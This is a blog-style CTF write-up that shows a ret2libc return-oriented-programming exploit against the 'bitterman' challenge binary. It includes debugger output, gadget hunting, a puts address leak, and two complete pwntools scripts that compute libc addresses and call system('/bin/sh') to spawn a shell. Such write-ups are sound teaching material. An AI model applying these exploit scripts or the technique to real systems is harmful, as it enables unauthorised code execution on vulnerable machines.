---
layout:     post
title:      "ROP - ret2libc attack"
date:       2019-07-29
author:     "D4mianwayne"
tag:      rop, pwn, ret2libc, bof
category: Return Oriented Programming
---

Today, I will show you how to use Return Oriented Programming for doing a **ret2libc** attack.

# Foreword

This is much more harder than what we encountered earlier, unlike before we won't have any function preloaded with strings like `/bin/cat flag.txt`. It won't even contain a `system` so we will use `libc.so.6` to get the `system` and `/bin/sh` address to spawn a shell.

# What is Return-to-libc or ret2libc attack?

A "return-to-libc" attack is a computer security attack usually starting with a buffer overflow in which a subroutine return address on a call stack is replaced by an address of a subroutine that is already present in the process’ executable memory, bypassing the no-execute bit feature (if present) and ridding the attacker of the need to inject their own code.

Returning to libc is a method of exploiting a buffer overflow on a system that has a non-executable stack, it is very similar to a standard buffer overflow, in that the return address is changed to point at a new location that we can control. However since no executable code is allowed on the stack we can't just tag in shellcode.   This is the reason we use the return into libc trick and utilize a function provided by the library. We still overwrite the return address with one of a function in libc, pass it the correct arguments and have that execute for us. Since these functions do not reside on the stack, we can bypass the stack protection and execute code.

# Binary Analysis

Let's try `checksec bitterman` and see what protections are enabled.

```
Arch:     amd64-64-little 
RELRO:    No RELRO
Stack:    No canary found 
NX:       NX enabled 
PIE:      No PIE
```

**NX** is enabled that means we have a non executable stack, hence we need a ret2libc attack.Let's load up the binary into radare2 and start analysing.

```
 0x0040077c      bfc9084000     mov edi, str.Please_enter_your_text: ; .//main.c:23 ; 0x4008c9 ; "> Please enter your text: " ; const char * s
|           0x00400781      e89afdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400786      488b050b0520.  mov rax, qword [obj.stdout] ; loc.stdout ; [0x600c98:8]=0
|           0x0040078d      4889c7         mov rdi, rax                ; FILE *stream
|           0x00400790      e8dbfdffff     call sym.imp.fflush         ; int fflush(FILE *stream)
|           0x00400795      488b9568ffff.  mov rdx, qword [local_98h]  ; .//main.c:24 ; size_t nbyte
```

It uses `puts` that seems vulnerable? Can't say much without checking. So, let's use gdb-peda:-

```
gdb-peda$ r
Starting program: /home/robin/ROP-Emporium/bitterman 
> What's your name? 
robin
Hi, robin

> Please input the length of your message: 
512
> Please enter your text:
**--pattern created--**
```

Doing that, we get **Program received signal SIGSEGV, Segmentation fault.**, look like the stack overflowed i.e. a buffer overflow. So, let's continue analysing the stack and core that has been dumped.

```
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0xb40 ('@\x0b')
RDX: 0x0 
RSI: 0x7ffff7dd18c0 --> 0x0 
RDI: 0x7ffff7dd0760 --> 0xfbad2a84 
RBP: 0x415341416f414152 ('RAAoAASA')
RSP: 0x7fffffffde48 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n8\255?\004\240\034Ґ\005@")
RIP: 0x4007e1 (<main+245>:	ret)
R8 : 0x7ffff7dd18c0 --> 0x0 
R9 : 0x7ffff7fdc4c0 (0x00007ffff7fdc4c0)
R10: 0x7ffff7b82cc0 --> 0x2000200020002 
R11: 0x246 
R12: 0x400590 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdf20 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4007d6 <main+234>:	call   0x400570 <fflush@plt>
   0x4007db <main+239>:	mov    eax,0x0
   0x4007e0 <main+244>:	leave  
=> 0x4007e1 <main+245>:	ret    
   0x4007e2:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x4007ec:	nop    DWORD PTR [rax+0x0]
   0x4007f0 <__libc_csu_init>:	push   r15
   0x4007f2 <__libc_csu_init+2>:	push   r14
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffde48 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n8\255?\004\240\034Ґ\005@")
0008| 0x7fffffffde50 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n8\255?\004\240\034Ґ\005@")
0016| 0x7fffffffde58 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n8\255?\004\240\034Ґ\005@")
0024| 0x7fffffffde60 ("AuAAXAAvAAYAAwAAZAAxAAyA\n8\255?\004\240\034Ґ\005@")
0032| 0x7fffffffde68 ("AAYAAwAAZAAxAAyA\n8\255?\004\240\034Ґ\005@")
0040| 0x7fffffffde70 ("ZAAxAAyA\n8\255?\004\240\034Ґ\005@")
0048| 0x7fffffffde78 --> 0xd21ca0043fad380a 
0056| 0x7fffffffde80 --> 0x400590 (<_start>:	xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004007e1 in main (argc=0x1, argv=0x7fffffffdf28) at main.c:28
28	main.c: No such file or directory.
```

Look, at **RSP** register is full of our pattern, in 64-bit register we cant overwrite **RIP** straight away so let's see our stack **RSP**, the Stack Pointer points to our input, we need to fix the return address and inject our code but for that we need to know where overflow occurs. Doing similar from what we did earlier let's get started:-

```
gdb-peda$ x/xg $rsp
0x7fffffffde48:	0x7141415441417041
gdb-peda$ pattern offset 0x7141415441417041
8160875829899915329 found at offset: 152
```

* `x/xg` : This loads the memory address of **RSP** register in hex format and in 64-bit format.
* `pattern offset < value >` : This shows after how many bytes the overflow occured.

We get the overflow limit i.e. **152**.

# Stage 1: Leaking the address

First, as told earlier we need to get `put` address from the running process. First, we need leak address then we need to get the constant distance which means the offset for it after that we will get to execute our code.

Let's get `puts` using `objdump -D bitterman | grep puts` :-

```
400520:	ff 25 2a 07 20 00    	jmpq   *0x20072a(%rip)        # 600c50 <puts@GLIBC_2.2.5>
```

As you can see we have one address at the left and one i the right. Let m clarify this:-

***
PLT stands for Procedure Linkage Table which is, put simply, used to call external procedures/functions whose address isn't known in the time of linking, and is left to be resolved by the dynamic linker at run time.
GOT stands for Global Offsets Table and is similarly used to resolve addresses.The Global Offset Table (or GOT) is a section inside of programs that holds addresses of functions that are dynamically linked. As mentioned in the page on calling conventions, most programs don't include every function they use to reduce binary size. Instead, common functions (like those in libc) are "linked" into the program so they can be saved once on disk and reused by every program. 
***

So, we get the address of **PLT** and **GOT** `puts` i.e. `0x400520` and `0x600c50` respectively.

##### The Gadget

For finding a gadget, I will use radare2's `/R < instruction >` command to find a `pop rdi; ret;` gadget.
```
[0x00400590]> /R pop rdi
  0x00400853                 5f  pop rdi
  0x00400854                 c3  ret
```

Let's copy the address i.e. `0x400853`.

Let's make the exploit:-

First off, we have `pop_rdi` gadget address and **PLT** and **GOT** `puts` address.

```
from pwn import * # importing fuctions 
#context(terminal=['gnome-terminal','new-window']) Debug purpose
#context.log_level = 'DEBUG' # Debug purpose
p = process('./bitterman') # using bitterman elf # processing the target elf
#p = gdb.debug('./bitterman','b main') # breakpoint setup at main via gdb
plt_put = p64(0x400520) # PLT put address 
got_put = p64(0x600c50) # GOT put address
pop_rdi = p64(0x400853) # pop_rdi address

padding = "A"*152 # Because we know the offset from earlier

payload = padding +  pop_rdi + got_put + plt_put 

p.recvuntil("name?") # recieve data until we recieve the string
p.sendline("robin")  # send data 
p.recvuntil("message:") # recieve data until we recieve the string
p.sendline("1024") # send data 
p.recvuntil("text:") # recieve data until we recieve the string
p.sendline(payload) # send data
p.recvuntil("Thanks!") # recieve data until we recieve the string
leaked_puts = p.recv()[:8].strip().ljust(8,"\x00") # recieving the string until we get leaked address and padding with null bytes to length of 8
log.success("Leaked puts: %s" %(leaked_puts)) # Prints the leaked addresss
p.interactive() # keeps the shell interactive
```
This script pretty much explains everything with comments. So, let's see what we get after running this:-

```
[+] Starting local process './bitterman': pid 3117
[*] '/home/robin/ROP-Emporium/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Leaked puts: ��E\x92\x87\x7f\x00\x00
[*] Switching to interactive mode
```

Great, we now have the leaked address, we need to find the offset which will be constant for every address. So, let's start carfting our **ret2libc** attack.

# Stage 2: Final Exploit using ret2libc

So, from the previous exploit we get the leaked address. Now we need to find the offset and execute the `/bin/sh` to spawn a shell.

First off, we need `main` address because the leak address will be changed everytime so we need to get main address so we can use the leaked address to get the offset for current process.
Using `objdump -D bitterman | grep main`, we will grab the address of the bitteman's `main`.

```
-snip--
00000000004006ec <main>:
--snip--
```
Nice, we have the main address. Let's proceed further for crafting the exploit. 

>Warning: Before we proceeds, we need the `libc.so.6` of your machine. Copy it with `cp //lib/x86_64-linux-gnu/libc.so.6 .` , it willcopy the`libc.so.6` to the working directory.

Now, we will automate the finding of addresses of `put` and `system`  with pwntools but beforehand we need `/bin/sh` address as well. To find that, let's use strings `strings -a -t x libc.so.6 | grep /bin/sh` , we will get the address of `/bin/sh` from the `libc.so.6`.

Let's make the exploit:-


```
#!/usr/bin/python

from pwn import * # importing fuctions 
#context(terminal=['gnome-terminal','new-window']) Debug purpose
#context.log_level = 'DEBUG' # Debug purpose
p = process('./bitterman') # using bitterman elf # processing the target elf
#p = gdb.debug('./bitterman','b main') # breakpoint setup at main via gdb
libc = ELF('libc.so.6')
plt_put = p64(0x400520) # PLT put address 
got_put = p64(0x600c50) # GOT put address
pop_rdi = p64(0x400853) # pop_rdi address
plt_main = p64(0x4006ec)

padding = "A"*152 # Because we know the offset from earlier

payload = padding +  pop_rdi + got_put + plt_put + plt_main

p.recvuntil("name?") # recieve data until we recieve the string
p.sendline("robin")  # send data 
p.recvuntil("message:") # recieve data until we recieve the string
p.sendline("1024") # send data 
p.recvuntil("text:") # recieve data until we recieve the string
p.sendline(payload) # send data
p.recvuntil("Thanks!") # recieve data until we recieve the string
leaked_puts = p.recv()[:8].strip().ljust(8,"\x00") # recieving the string until we get leaked address and padding with null bytes to length of 8
log.success("Leaked puts: %s" %(leaked_puts)) # Prints the leaked addresss
leaked_puts = u64(leaked_puts) # converts to 64-bit friendly integer


offset = leaked_puts - libc.symbols['puts'] # Ths
sys = p64(offset + libc.symbols['system'])
sh = p64(offset + 0x1b3e9a)

payload = padding+ p64(0x0000000000400509) + pop_rdi + sh + sys # remove p64(0x0000000000400509) if you're not using ubuntu
p.sendline("robin")
p.recvuntil("message:")
p.sendline("1024")
p.recvuntil("text:")
p.sendline(payload)
p.recvuntil("Thanks!")


p.interactive()
```

**This will spawn a shell and hence you learned how to do a ret2libc attack**.
In a nutshell, we used the leak address to find the offset and hence using the gadget we overwrite the instruction pointer while calling the `system` and `/bin/sh` hence spawning a shell.

```

robin@oracle:~/ROP$ python exploit2.py
[+] Starting local process './bitterman': pid 12562
[*] '/home/robin/ROP-Emporium/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Leaked puts: ��3\x84�\x00
[*] Switching to interactive mode

$ id
uid=1000(robin)

```

# Final Words

Thanks to [@Lord_Idiot](https://twitter.com/__lord_idiot) for helping me out with the stack alignment issue.

##### The MOVAPS issue

***
If you're using Ubuntu 18.04 and segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the 64 bit challenges then ensure the stack is 16 byte aligned before returning to GLIBC functions such as printf() and system(). The version of GLIBC packaged with Ubuntu 18.04 uses movaps instructions to move data onto the stack in some functions. The 64 bit calling convention requires the stack to be 16 byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.
***

That was it. Until then, **pwn**.

##### Files

Bitterman: <https://github.com/ctfs/write-ups-2015/raw/master/camp-ctf-2015/pwn/bitterman-300/bitterman>